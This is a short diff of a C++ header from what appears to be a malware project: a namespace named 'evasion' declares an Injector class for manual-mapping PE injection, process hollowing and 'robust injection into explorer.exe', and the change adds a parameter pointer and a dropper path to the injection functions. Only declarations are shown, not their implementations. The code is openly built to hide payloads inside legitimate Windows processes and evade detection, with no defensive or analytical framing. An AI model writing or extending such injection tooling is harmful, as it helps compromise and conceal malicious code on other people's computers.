@@ -9,7 +9,7 @@ namespace evasion {
 class Injector {
 public:
     // Manual Mapping / PE Injection
-    static bool MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload);
+    static bool MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID pParam = NULL);
 
     // Process Hollowing (uses MapAndInject)
     static bool HollowProcess(const std::wstring& targetPath, const std::vector<uint8_t>& payload);
@@ -18,7 +18,7 @@ public:
     static DWORD GetProcessIdByName(const std::wstring& processName);
 
     // Robust injection into explorer.exe
-    static bool InjectIntoExplorer(const std::vector<uint8_t>& payload);
+    static bool InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath = L"");
 };
 
 } // namespace evasion
